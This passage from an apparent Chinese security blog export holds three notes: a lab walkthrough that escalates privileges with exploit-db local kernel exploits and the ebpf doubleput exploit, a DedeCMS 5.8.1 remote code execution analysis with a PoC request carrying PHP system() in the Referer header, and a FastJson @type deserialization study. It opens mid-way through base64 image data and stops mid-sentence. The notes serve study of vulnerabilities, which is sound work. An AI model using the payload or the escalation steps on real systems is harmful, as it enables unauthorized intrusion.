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" alt>

<p>（同样来自<a class="link" href="https://www.exploit-db.com/exploits/40049%EF%BC%89">https://www.exploit-db.com/exploits/40049）<i class="fas fa-external-link-alt"></i></a></p>
<p>文档里有写了两个c语言代码，打包成两个文件，上传到靶机中</p>
<img src="1503868-20200719103649350-219216572.png" alt loading="lazy">

<p>蚁剑上传</p>
<img src="1503868-20200719103655743-501678192.png" alt loading="lazy">

<p> </p>
<p> 按教程一步一步操作</p>
<p> gcc decr.c -m32 -O2 -o decr</p>
<p>gcc pwn.c -O2 -o pwn</p>
<p>这里出错了</p>
<img src="1503868-20200719105427202-1090474686.png" alt loading="lazy">

<p> </p>
<p> 看不懂代码，，，先放在这里</p>
<p><strong>第二个，</strong></p>
<p>cat /usr/share/exploitdb/exploits/linux/local/47170.c <br>看了一下，只要把文件上传上去，编译运行就好了</p>
<img src="1503868-20200719110648014-1819670930.png" alt loading="lazy">

<p> </p>
<p>然而又失败了，靶机处理器核心太少</p>
<p><strong>第三个：</strong></p>
<p>同样，先cat</p>
<p>cat /usr/share/exploitdb/exploits/linux/local/44300.c</p>
<p>和第一个差不多，两个文件，上传，编译，运行（名字都是一样的）</p>
<img src="1503868-20200719111253985-956796982.png" alt loading="lazy">

<p> </p>
<p> <img src="1503868-20200719111434848-567301618.png" alt loading="lazy"></p>
<p> 还是tmd失败了      ++</p>
<p> </p>
<p>看别人的博客才知道要用39772那个漏洞（他们怎么找到）</p>
<p> cat /usr/share/exploitdb/exploits/linux/local/39772.txt<br>需要从gayhub上下载文件<br><img src="1503868-20200719135146582-1577570471.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p>文件下载失败，找不到该文件。</p>
<p>先这样吧</p>
<p> </p>
<p>linux下下载失败是代理的问题（似乎）</p>
<p>windows下下载失败是我™的火狐和idm的问题，过了几天换个edge就屁事没有</p>
<p> </p>
<p>把文件通过vmtool发送给kali</p>
<p>然后在kali本地搭建简易python  http环境</p>
<p>python -m SimpleHTTPServer<br><br></p>
<p>在shell里面wget下载这个文件</p>
<p> </p>
<p> 解压</p>
<p>unzip</p>
<p>tar -xvf</p>
<p>按39772.txt里给的教程进行提权</p>
<p>进入ebpf_mapfd_doubleput_exploit</p>
<p>./compile.sh<br>./doubleput</p>
<p>等待几秒，提示出现就ok了</p>
<img src="1503868-20200723010414777-984406172.png" alt loading="lazy">

<img src="1503868-20200723010201807-1159350013.png" alt loading="lazy">

<p> </p>
<br>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Dedecms预认证远程代码执行漏洞</title>
    <url>/2021/10/12/Dedecms%E9%A2%84%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-This-is-Y/</url>
    <content><![CDATA[<h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>参考：<a class="link" href="https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">https://www.ddosi.org/dedecms-poc/#ShowMsg_%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E<i class="fas fa-external-link-alt"></i></a></p>
<p>这个漏洞只影响5.8.1 预发布版本<br>下载链接：<a class="link" href="https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip">https://github.com/dedecms/DedeCMS/archive/refs/tags/v5.8.1.zip<i class="fas fa-external-link-alt"></i></a></p>
<p>验证版本：<a class="link" href="http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt">http://127.0.0.1/DedeCMS-5.8.1/data/admin/ver.txt<i class="fas fa-external-link-alt"></i></a><br><img src="image-20211012155400476.png" alt="image-20211012155400476"></p>
<p>先看一下它的poc跟着走一下代码<br>POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;plus&#x2F;flink.php?dopost&#x3D;save&amp;c&#x3D;id HTTP&#x2F;1.1</span><br><span class="line">Host: target</span><br><span class="line">Referer: &lt;?php &quot;system&quot;($c);die;&#x2F;*</span><br></pre></td></tr></table></figure>
<p>bp抓包，修改一下，传给phpstorm<br><img src="image-20211012162516995.png" alt="image-20211012162516995"></p>
<p>跳到ShowMsg函数里面</p>
<p><img src="image-20211012162614100.png" alt="image-20211012162614100"></p>
<p>gourl传入的是-1<img src="image-20211012162722990.png" alt="image-20211012162722990"><br>所以这里会从HTTP_REFERER里获取gourl，POC这里是&lt;?php “system”($c);die;/*</p>
<p>然后gourl会嵌入到$func变量里，$func变量又会拼接到$msg遍历里面，最后，由DedeTemplate()类里的LoadString()方法和Display()来处理$msg变量，接下来看LoadSting()和Display()</p>
<p><img src="image-20211012163457451.png" alt="image-20211012163457451"><br><img src="image-20211012163517491.png" alt="image-20211012163517491"></p>
<p>DedeTemplate()类在include/dedetemplate.class.php文件里，372行处是LoadString()函数，<br>函数把$this-&gt;sourceString设置为了传入的msg，然后cachedir值为/data/tplcache，然后在本地目录找到了这个文件，打开它，发现location这个地方还是&lt;?php “system”($c);die;/*</p>
<p><img src="image-20211012165040497.png" alt="image-20211012165040497"></p>
<p><img src="image-20211012164840863.png" alt="image-20211012164840863"></p>
<p>继续看代码，走完$this-&gt;ParseTemplate();这一步，this-&gt;sourceString里的location还是<br>Referer:  &lt;?php “system”($c);die;/*。<br><img src="image-20211012165749148.png" alt="image-20211012165749148"></p>
<p>然后走display，display里有一步WriteCach()，跟进</p>
<p><img src="image-20211012165918492.png" alt="image-20211012165918492"></p>
<p>进入到WriteCache()后，我这里的走向和参考博客里不一样，我这里if判断为false，直接跳出来了，但是不走if里面的代码，最后也能出来结果，有点迷惑，</p>
<p><img src="image-20211012183403469.png" alt="image-20211012183403469"></p>
]]></content>
  </entry>
  <entry>
    <title>FastJson反序列化分析笔记</title>
    <url>/2023/10/27/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0-y-acer-3/</url>
    <content><![CDATA[<h1 id="两个特性"><a href="#两个特性" class="headerlink" title="两个特性"></a>两个特性</h1><h2 id="用户可控制反序列化的对象"><a href="#用户可控制反序列化的对象" class="headerlink" title="用户可控制反序列化的对象"></a>用户可控制反序列化的对象</h2><p>user类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user构造函数user(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是调用函数,我都是写在各种小test里，然后在main中调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//test1();</span></span><br><span class="line">        <span class="comment">//test2();</span></span><br><span class="line">        test3();</span><br><span class="line">        <span class="comment">//test4();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="安全的使用方法："><a href="#安全的使用方法：" class="headerlink" title="安全的使用方法："></a>安全的使用方法：</h3><p>先看正确的使用方法:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// 安全的写法</span></span><br><span class="line">        String p1 = <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">        user tmpuser = JSON.parseObject(p1, user.class);  <span class="comment">//限制死了反序列化的类型为user</span></span><br><span class="line">        System.out.println(tmpuser.getAge());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231027102647188.png" alt="image-20231027102647188"></p>
<p>可以看到输出中，出现了</p>
<p><code>user构造函数user(无参数)</code></p>
<p>这是因为需要构造user对象tmpuser。</p>
<p><code>user调用了setAge user调用了setHobby user调用了setName</code></p>
<p>这三个出现，是因为在构造过程中，给age，name，hobby这三个属性赋值了。</p>
<p><code>user调用了getAg  </code><br><code>18</code> </p>
<p>是tmpuser.getAge()这一行输出的。</p>
<p>限制死了反序列化的类型为user，这种由开发者控制的反序列化的类型，是安全的。</p>
<h3 id="不安全的使用方法："><a href="#不安全的使用方法：" class="headerlink" title="不安全的使用方法："></a>不安全的使用方法：</h3><p>因为fastjson有一个特性，可以由用户指定反序列化的类型，通过@type字段。可以先设置另一个user2对象</p>
<p>代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">user2</span> </span>&#123;    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(无参数)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">user2</span><span class="params">(String name, <span class="keyword">int</span> age, String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2构造函数user2(有参数)&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getHobby</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了getHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobby</span><span class="params">(String hobby)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;user2调用了setHobby&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后是调用代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    String p2 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user2\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">    Object P1 = JSON.parse(p1);</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parse(p2):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parse(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<p><img src="image-20231027111614060.png" alt="image-20231027111614060"></p>
<p>可以将test()理解为一个函数，用户输入序列化后的字符串交给服务器，服务器对字符串进行反序列化，这里输入的p1,p2就可以理解为调用了两次函数。</p>
<h2 id="调用getName方法"><a href="#调用getName方法" class="headerlink" title="调用getName方法"></a>调用getName方法</h2><p>但反序列化字符串的函数不是parse而是parseObject时，就会调用对象中的getter类方法，比如getName，getAge,getHobby。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parse(p1):&quot;</span>);</span><br><span class="line">       Object P1 = JSON.parse(p1);</span><br><span class="line">       System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">       Object P2 = JSON.parseObject(p1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="image-20231027112258302.png" alt="image-20231027112258302"></p>
<p>在了解这两种机制后，就可能会出现下面这种情况：代码中出现了 JSON.parseObject(p1); 可能设计初衷只是想解析反序列化”{&quot;age&quot;:18,&quot;hobby&quot;:&quot;gaming&quot;,&quot;name&quot;:&quot;y&quot;}”这样的字符串，但是因为这两个特性，就可能出现一些意想不到的结果</p>
<h1 id="调用流程分析"><a href="#调用流程分析" class="headerlink" title="调用流程分析"></a>调用流程分析</h1><p>先来捋顺正常的调用，再来看漏洞的调用</p>
<h2 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h2><h3 id="识别-type"><a href="#识别-type" class="headerlink" title="识别@type"></a>识别@type</h3><p>使用如下代码，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">    String p1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;JSON.parseObject(p1):&quot;</span>);</span><br><span class="line">    Object P2 = JSON.parseObject(p1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>断点下载        Object P2 = JSON.parseObject(p1); </p>
<p>前面都是普通的调来调去，一直到这里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">parse</span><span class="params">(Object fieldName)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">final</span> JSONLexer lexer = <span class="keyword">this</span>.lexer;</span><br><span class="line">       <span class="keyword">switch</span> (lexer.token()) &#123;</span><br><span class="line">…………</span><br><span class="line">   …………</span><br><span class="line">           <span class="keyword">case</span> LBRACE:</span><br><span class="line">               JSONObject object = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">               <span class="keyword">return</span> parseObject(object, fieldName);</span><br><span class="line">   …………</span><br><span class="line">   ………… </span><br></pre></td></tr></table></figure>

<p><img src="image-20231030110516526.png" alt="image-20231030110516526"></p>
<p>这里的lexer是由之前JSON.java中的</p>
<p><code>DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);</code></p>
<p>这一行定义和赋值</p>
<p>在swtich中，识别到第一个字符串是<code>&#123;</code> (也就是 LBRACE )后，通过</p>
<p><code>return parseObject(object, fieldName);</code></p>
<p>进入到了parseObject函数中，这个函数还是在当前DefaultJSONParser.java文件中</p>
<p><img src="image-20231030111221334.png" alt="image-20231030111221334"></p>
<p>经过几个判断后，进入到try finally 代码块中，这里面是一个for(;;)死循环，然后可以看到有一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        object.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ………………</span><br><span class="line">    ………………</span><br></pre></td></tr></table></figure>

<p><code>JSON.DEFAULT_TYPE_KEY</code>是<code>@type</code> </p>
<p>lexer.isEnabled()会返回入参的mask字段，这边的<code>Feature.DisableSpecialKeyDetect</code>内容如下，所以!lexer.isEnabled(Feature.DisableSpecialKeyDetect)的结果为true</p>
<p><img src="image-20231030112553007.png" alt="image-20231030112553007"></p>
<p>随后就获取到@type的value：<code>org.example.user</code></p>
<p>这边的意思大概就是，通过识别到<code>&#123;</code>开头，然后开始进行反序列化的字符从识别，识别到@type，意味着需要指定类进行java反序列化。这边的下一行</p>
<p><code>Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());</code></p>
<p>就是加载制定的类以便于反序列化</p>
<h3 id="加载指定类"><a href="#加载指定类" class="headerlink" title="加载指定类"></a>加载指定类</h3><p>在上面用loadlass加载完类后，继续这个if代码块，在最下面有一个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectDeserializer deserializer = config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>这边是为了获取反序列化器deserializer，跟进getDeserializer，因为<code>type instanceof Class&lt;?&gt;</code>，跳到<code> getDeserializer((Class&lt;?&gt;) type, type)</code>中，</p>
<p>在这个getDeserializer，会经过一些替换处理，if判断，比如说会把<code>$</code>换成<code>.</code></p>
<ul>
<li>className = className.replace(‘$’, ‘.’);</li>
</ul>
<p>会检测是否<code>java.awt.</code>开头等等。</p>
<p>最后因为传入的value是org.example.user，流程会来到461行的</p>
<p><code>derializer = createJavaBeanDeserializer(clazz, type);</code></p>
<p><img src="image-20231030115601476.png" alt="image-20231030115601476"></p>
<p>跟进createJavaBeanDeserializer(),这个函数里的判断主要是围绕 <strong>asmEnable</strong> 变量的true和false来进行的，在一系列的处理后，来到了</p>
